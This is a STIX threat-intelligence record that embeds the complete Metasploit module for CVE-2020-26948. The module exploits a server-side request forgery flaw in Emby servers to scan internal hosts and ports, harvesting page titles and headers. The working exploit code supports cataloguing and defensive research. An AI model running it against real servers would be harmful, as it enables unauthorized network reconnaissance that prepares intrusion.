{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--410c252d-14ae-4751-b153-50b4ecdc1966",
    "created": "2024-08-14T16:30:44.337372Z",
    "modified": "2024-08-14T16:30:44.337376Z",
    "name": "Emby SSRF HTTP Scanner",
    "description": "Generates a `GET` request to the provided web servers and executes an SSRF against the targeted EMBY server. Returns the server header, HTML title attribute and location header (if set). This is useful for rapidly identifying web applications",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/emby_ssrf_scanner.rb",
            "external_id": "emby_ssrf_scanner.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-26948"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/btnz-k/emby_ssrf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'Emby SSRF HTTP Scanner',\n      'Description' => 'Generates a `GET` request to the provided web servers and executes an SSRF against\n                        the targeted EMBY server. Returns the server header, HTML title attribute and\n                        location header (if set). This is useful for rapidly identifying web applications\n                        on the internal network using the Emby SSRF vulnerability (CVE-2020-26948).',\n      'Author' => 'Btnz',\n      'License' => MSF_LICENSE,\n      'Disclosure Date' => '2020-10-01',\n      'Notes'               => {\n        'Stability'         => [],\n        'SideEffects'       => [],\n        'Reliability'       => [],\n        'RelatedModules' => ['auxiliary/scanner/http/emby_version_ssrf'],\n      },\n      'References' => [\n        ['CVE', '2020-26948'],\n        ['URL', 'https://github.com/btnz-k/emby_ssrf']\n      ]\n    )\n\n    deregister_options('VHOST', 'RPORT', 'SNAPLEN', 'SSL')\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [false, 'The URI of the Emby Server', '/']),\n        OptBool.new('STORE_NOTES', [true, 'Store the information in notes.', true]),\n        OptBool.new('SHOW_TITLES', [true, 'Show the titles on the console as they are grabbed', true]),\n        OptString.new('EMBY_SERVER', [true, 'Emby Web UI IP to use', '']),\n        OptInt.new('EMBY_PORT', [true, 'Web UI port for Emby Server', '8096']),\n        OptString.new('PORTS', [true, 'Ports to scan', '80,8080,8081,8888'])\n      ]\n    )\n  end\n\n  def run_host(target_host)\n    # Do some checking to ensure data is submitted\n    # Also converts ports string to list\n    dports = Rex::Socket.portspec_crack(datastore['PORTS'])\n    raise Msf::OptionValidateError, ['PORTS'] if dports.empty?\n\n    # loop through the ports\n    dports.each do |p|\n      vprint_status(\"Attempting SSRF with target #{target_host}:#{p}\")\n      uri = \"/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}\"\n      # not using send_request_cgi due to difference between RHOSTS and EMBY_SERVER\n      res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])\n\n      # Check for Response\n      if res.nil?\n        vprint_error(\"http://#{target_host}:#{p} - No response\")\n        next\n      end\n\n      # Retrieve the headers to capture the Location and Server header\n      server_header = res['server']\n      location_header = res['location']\n\n      # Check to see if the captured headers are populated\n      if server_header.nil? && location_header.nil?\n        vprint_error(\"#{target_host}:#{p} No HTTP headers\")\n      end\n\n      # If the body is blank, just stop now as there is no chance of a title\n      vprint_error(\"#{target_host}:#{p} No webpage body\") if res.body.nil?\n\n      # Very basic, just match the first title tag we come to. If the match fails,\n      # there is no chance that we will have a title\n      rx = %r{<title>[\\n\\t\\s]*(?<title>.+?)[\\s\\n\\t]*</title>}im.match(res.body.to_s)\n      unless rx\n        vprint_error(\"#{target_host}:#{p} No webpage title\")\n        next\n      end\n\n      # Last bit of logic to capture the title\n      rx[:title].strip!\n      if rx[:title].empty?\n        vprint_error(\"#{target_host}:#{p} No webpage title\")\n        next\n      end\n\n      rx_title = Rex::Text.html_decode(rx[:title])\n      if datastore['SHOW_TITLES']\n        print_good(\"#{target_host}:#{p} Title: #{rx_title}\")\n        print_good(\"#{target_host}:#{p}     HTTP Code: #{res.code}\")\n        print_good(\"#{target_host}:#{p}     Location Header: #{location_header}\")\n        print_good(\"#{target_host}:#{p}     Server Header: #{server_header}\")\n      end\n      if datastore['STORE_NOTES']\n        notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header }\n        report_note(host: target_host, port: p, type: 'http.title', data: notedata, update: :unique_data)\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "Btnz",
        ""
    ]
}